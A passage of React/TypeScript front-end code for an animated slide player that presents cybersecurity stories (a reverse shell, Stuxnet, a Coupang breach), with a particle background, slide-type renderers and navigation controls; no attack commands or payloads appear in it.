  return <DesktopAttackStage stage={stage} />;
}

// Particle Network Background Component
function ParticleNetwork() {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    
    const ctx = canvas.getContext('2d');
    if (!ctx) return;
    
    let animationId: number;
    let particles: Array<{x: number, y: number, vx: number, vy: number}> = [];
    
    const resize = () => {
      canvas.width = canvas.offsetWidth;
      canvas.height = canvas.offsetHeight;
    };
    
    const init = () => {
      resize();
      particles = [];
      const particleCount = Math.floor((canvas.width * canvas.height) / 15000);
      for (let i = 0; i < particleCount; i++) {
        particles.push({
          x: Math.random() * canvas.width,
          y: Math.random() * canvas.height,
          vx: (Math.random() - 0.5) * 0.5,
          vy: (Math.random() - 0.5) * 0.5
        });
      }
    };
    
    const animate = () => {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      
      particles.forEach((p, i) => {
        p.x += p.vx;
        p.y += p.vy;
        
        if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
        if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
        
        ctx.beginPath();
        ctx.arc(p.x, p.y, 1.5, 0, Math.PI * 2);
        ctx.fillStyle = 'rgba(0, 240, 255, 0.5)';
        ctx.fill();
        
        for (let j = i + 1; j < particles.length; j++) {
          const p2 = particles[j];
          const dx = p.x - p2.x;
          const dy = p.y - p2.y;
          const dist = Math.sqrt(dx * dx + dy * dy);
          
          if (dist < 100) {
            ctx.beginPath();
            ctx.moveTo(p.x, p.y);
            ctx.lineTo(p2.x, p2.y);
            ctx.strokeStyle = `rgba(0, 240, 255, ${0.15 * (1 - dist / 100)})`;
            ctx.lineWidth = 0.5;
            ctx.stroke();
          }
        }
      });
      
      animationId = requestAnimationFrame(animate);
    };
    
    init();
    animate();
    window.addEventListener('resize', init);
    
    return () => {
      cancelAnimationFrame(animationId);
      window.removeEventListener('resize', init);
    };
  }, []);
  
  return <canvas ref={canvasRef} className="particle-canvas" />;
}

export default function Home() {
  const [currentStory, setCurrentStory] = useState<string>("reverseShell");
  const [currentSlide, setCurrentSlide] = useState(0);
  const [ratio, setRatio] = useState<"16:9" | "9:16">("16:9");
  const [animationKey, setAnimationKey] = useState(0);
  const [isSmallViewport, setIsSmallViewport] = useState(false);
  
  const story = stories[currentStory];
  
  // Detect small viewport for compact mode
  useEffect(() => {
    const checkSize = () => {
      setIsSmallViewport(window.innerWidth < 500);
    };
    checkSize();
    window.addEventListener('resize', checkSize);
    return () => window.removeEventListener('resize', checkSize);
  }, []);

  const goToSlide = useCallback((index: number) => {
    if (index >= 0 && index < story.slides.length) {
      const prevSlide = story.slides[currentSlide];
      const nextSlide = story.slides[index];
      if (prevSlide.type !== nextSlide.type) {
        setAnimationKey(prev => prev + 1);
      }
      setCurrentSlide(index);
    }
  }, [currentSlide, story.slides]);

  const switchStory = useCallback((storyId: string) => {
    setCurrentStory(storyId);
    setCurrentSlide(0);
    setAnimationKey(prev => prev + 1);
  }, []);

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "ArrowRight" || e.key === " ") {
        e.preventDefault();
        goToSlide(currentSlide + 1);
      } else if (e.key === "ArrowLeft") {
        e.preventDefault();
        goToSlide(currentSlide - 1);
      }
    };
    
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [currentSlide, goToSlide]);

  const renderSlide = (slide: Slide, index: number) => {
    if (index !== currentSlide) return null;

    switch (slide.type) {
      case "title":
        return (
          <div className="slide-content" key={animationKey}>
            <h1 className="slide-title">{slide.title}</h1>
            <p className="slide-subtitle">{slide.subtitle}</p>
          </div>
        );

      case "text":
        return (
          <div className="slide-content" key={animationKey}>
            <p className="slide-text" dangerouslySetInnerHTML={{ __html: slide.content || "" }} />
            {slide.subtext && <p className="slide-subtitle mt-5">{slide.subtext}</p>}
          </div>
        );

      case "bigNumber":
        return (
          <div className="slide-content" key={animationKey}>
            <div className="big-number">{slide.number}</div>
            <p className="big-label">{slide.label}</p>
          </div>
        );

      case "stats":
        return (
          <div className="slide-content" key={animationKey}>
            <div className="stat-grid">
              {slide.items?.map((item, i) => (
                <div key={i} className="stat-card" style={{ animationDelay: `${i * 0.15}s` }}>
                  <div className="stat-value">{item.value}</div>
                  <div className="stat-label">{item.label}</div>
                </div>
              ))}
            </div>
          </div>
        );

      case "attackTree":
        return (
          <div className="slide-content" key={animationKey}>
            <div className="attack-tree">
              <div className="tree-level">
                <div className="tree-node root">{slide.root}</div>
              </div>
              {slide.phases?.map((phase, pi) => (
                <div key={pi}>
                  <div className="tree-connector" />
                  <div className="tree-level">
                    {phase.map((node, ni) => (
                      <div 
                        key={ni} 
                        className="tree-node phase"
                        style={{ animationDelay: `${(pi * 0.3) + (ni * 0.1)}s` }}
                      >
                        {node}
                      </div>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </div>
        );

      case "network":
        return (
          <div className="slide-content" key={animationKey}>
            <h2 className="slide-subtitle mb-6">{slide.title}</h2>
            <div className="flow-diagram">
              {slide.nodes?.map((node, i) => (
                <div key={i} className="flow-item" style={{ animationDelay: `${i * 0.15}s` }}>
                  <div className={`flow-node ${node.infected ? "infected" : ""}`}>
                    {node.label}
                  </div>
                  {i < (slide.nodes?.length || 0) - 1 && (
                    <div className="flow-arrow">→</div>
                  )}
                </div>
              ))}
            </div>
          </div>
        );

      case "attackFlow":
        return (
          <div className="slide-content attack-flow-slide" key={animationKey}>
            <AttackStage stage={slide.stage || 0} isMobile={ratio === "9:16"} isCompact={ratio === "16:9" && isSmallViewport} />
          </div>
        );

      case "timeline":
        return (
          <div className="slide-content" key={animationKey}>
            <h2 className="slide-subtitle mb-6">{slide.title}</h2>
            <div className="timeline">
              {slide.events?.map((event, i) => (
                <div 
                  key={i} 
                  className="timeline-item"
                  style={{ animationDelay: `${i * 0.15}s` }}
                >
                  <div className="timeline-year">{event.year}</div>
                  <div className="timeline-text">{event.text}</div>
                </div>
              ))}
            </div>
          </div>
        );

      case "code":
        return (
          <div className="slide-content" key={animationKey}>
            <h2 className="slide-subtitle mb-5">{slide.title}</h2>
            <div className="code-block">
              {slide.lines?.map((line, i) => (
                <div 
                  key={i} 
                  className="code-line"
                  style={{ animationDelay: `${i * 0.1}s` }}
                >
                  {line.type === "comment" ? (
                    <span className="code-comment">{line.text}</span>
                  ) : (
                    line.text || "\u00A0"
                  )}
                </div>
              ))}
            </div>
          </div>
        );

      case "map":
        return (
          <div className="slide-content" key={animationKey}>
            <MapSlide slide={slide} />
          </div>
        );

      case "terminal":
        return (
          <div className="slide-content terminal-content" key={animationKey}>
            <TerminalSlide slide={slide} />
          </div>
        );

      case "reverseShellFlow":
        return (
          <div className="slide-content attack-flow-slide" key={animationKey}>
            <ReverseShellFlow stage={slide.stage || 0} isMobile={ratio === "9:16"} />
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <div className="player-container">
      {/* Story Selector */}
      <div className="story-selector">
        <select 
          value={currentStory} 
          onChange={(e) => switchStory(e.target.value)}
        >
          <option value="reverseShell">🐚 Reverse Shell</option>
          <option value="stuxnet">🦠 Stuxnet</option>
          <option value="coupang">🛒 Coupang Breach</option>
        </select>
      </div>
      
      {/* Ratio Controls */}
      <div className="controls">
        <button
          className={ratio === "16:9" ? "active" : ""}
          onClick={() => setRatio("16:9")}
        >
          16:9
        </button>
        <button
          className={ratio === "9:16" ? "active" : ""}
          onClick={() => setRatio("9:16")}
        >
          9:16
        </button>
      </div>

      {/* Stage */}
      <div className={`stage ${ratio === "16:9" ? "ratio-16-9" : "ratio-9-16"}`}>
        <ParticleNetwork />
        <div className="slide active">
          {renderSlide(story.slides[currentSlide], currentSlide)}
        </div>
      </div>

      {/* Navigation */}
      <nav className="nav">
        <button
          className="nav-btn"
          onClick={() => goToSlide(currentSlide - 1)}
          disabled={currentSlide === 0}
        >
          ←
        </button>
        <div className="progress">
          <span>{currentSlide + 1}</span> / <span>{story.slides.length}</span>
        </div>
        <div className="progress-bar">
          <div
            className="progress-fill"
            style={{ width: `${((currentSlide + 1) / story.slides.length) * 100}%` }}
          />
        </div>
        <button
          className="nav-btn"
          onClick={() => goToSlide(currentSlide + 1)}
          disabled={currentSlide === story.slides.length - 1}
        >
          →
        </button>
      </nav>
    </div>
  );
}
